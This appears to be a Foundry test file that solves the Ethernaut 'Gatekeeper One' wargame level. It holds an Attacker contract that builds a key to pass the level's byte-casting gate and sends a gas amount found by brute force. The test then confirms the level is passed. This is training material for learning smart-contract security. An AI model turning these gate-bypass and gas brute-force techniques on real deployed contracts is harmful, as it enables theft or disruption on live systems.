pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../GatekeeperOne/GatekeeperOneFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract Attacker is DSTest {
    function enter(GatekeeperOne target) external {
        // arr = 0x12345678
        // big endian: arr[0]: 0x12 arr[1]: 0x34 arr[3]: 0x56 arr[4]: 0x78
        // little endian: arr[0]: 0x78 arr[1]: 0x56 arr[3]: 0x34 arr[4]: 0x12
        // abi.encodePacked puts the first index at the rightmost byte
        // uint160(address(100) is little endian: arr[0]: 0x64 arr[1]: 0x00 arr[3]: 0x00 arr[4]: 0x00 ...
        // abi.encodePacked(uint160(address(100)) -> 0, 0, 0, ... , 100 : Total 20 byte
        /*
        emit log_named_uint(
            "uint64(bytes8(abi.encodePacked(uint160(tx.origin))))",
            uint64(bytes8(abi.encodePacked(uint160(tx.origin))))
        );
        */

        bytes8 key = bytes8(0x6400000000000064);
        // emit log_named_address("tx.origin", tx.origin); // 0x64
        // emit log_named_uint("uint16(uint160(tx.origin))", uint16(uint160(tx.origin))); // 0x64
        // emit log_named_uint("key", uint64(key)); // == 6 * 16^15 + 4 * 16^14 + 6 * 16 + 4

        // TIP: how abi.encodePacked works
        // abi.encodePacked(uint8(1), uint8(2)) -> 1, 2
        /*
        bytes memory packed = abi.encodePacked(uint160(257));
        for (uint i = 0; i < packed.length; i++) {
            emit log_uint(uint8(packed[i])); // 0: 0, 1: 0, ..., 18: 1, 19: 1
        }
        */

        target.enter{ gas: 8191*10 + 271 }(key);
        // I figured out how much gas costs through a brute-force method.
        /*
        for (uint i = 0; i < 8191; i++) {
            try target.enter{ gas: 8191*10 + i }(key)  {
                emit log_named_uint("i", i); // 271
            }
            }
        }
        */
    }
}

contract GatekeeperOneTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    // address eoaAddress = address(0x4B994361257d060cF20dab2F13286B16B0019FdE);
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testGatekeeperOneHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        vm.startPrank(eoaAddress, eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        Attacker attacker = new Attacker();
        attacker.enter(ethernautGatekeeperOne);
        address entrant = ethernautGatekeeperOne.entrant();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
